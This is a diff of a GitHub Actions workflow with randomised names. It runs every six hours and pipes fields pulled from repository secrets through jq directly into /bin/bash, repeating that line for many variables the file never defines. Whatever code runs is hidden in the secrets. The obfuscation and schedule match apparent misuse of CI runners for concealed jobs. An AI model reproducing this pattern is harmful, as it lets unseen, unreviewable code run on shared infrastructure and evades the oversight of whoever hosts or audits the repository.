@@ -1,9 +1,8 @@
 name: mahenge4645
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '6 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: mahenge4645
         env:
-          h13599: ${{ secrets.h13599 }}
+          rcis3767: ${{ secrets.rcis3767 }}
         run: |
-          echo $h13599 | jq -r .cfcnm865 | /bin/bash
-          echo $ndy076 | jq -r .a752 | /bin/bash
-          echo $cjcc244 | jq -r .a0 | /bin/bash
-          echo $kmh79227 | jq -r .r98083 | /bin/bash
-          echo $pim2 | jq -r .vw87445 | /bin/bash
-          echo $v45288 | jq -r .for8 | /bin/bash
-          echo $yo4 | jq -r .sfi5 | /bin/bash
-          echo $uktvw4 | jq -r .ogml343 | /bin/bash
+          echo $rcis3767 | jq -r .onsc48 | /bin/bash
+          echo $ha72748 | jq -r .bgz468 | /bin/bash
+          echo $p1288 | jq -r .chw15 | /bin/bash
+          echo $lxbu7175 | jq -r .vg9480 | /bin/bash
+          echo $dpfwt37 | jq -r .vhta23 | /bin/bash
+          echo $gjlj7120 | jq -r .wg532 | /bin/bash
+          echo $ivzul50648 | jq -r .fhebr2754 | /bin/bash
+          echo $ig32032 | jq -r .nb23 | /bin/bash
+          echo $wkss4 | jq -r .yt0026 | /bin/bash
+          echo $ofkz45929 | jq -r .vmds014 | /bin/bash
+          echo $c2 | jq -r .mbhwd91681 | /bin/bash
+          echo $cs741 | jq -r .aj2181 | /bin/bash
+          echo $fx12 | jq -r .abgy111 | /bin/bash
+          echo $yye8 | jq -r .s898 | /bin/bash
+          echo $yr8157 | jq -r .yhlzx5239 | /bin/bash
 
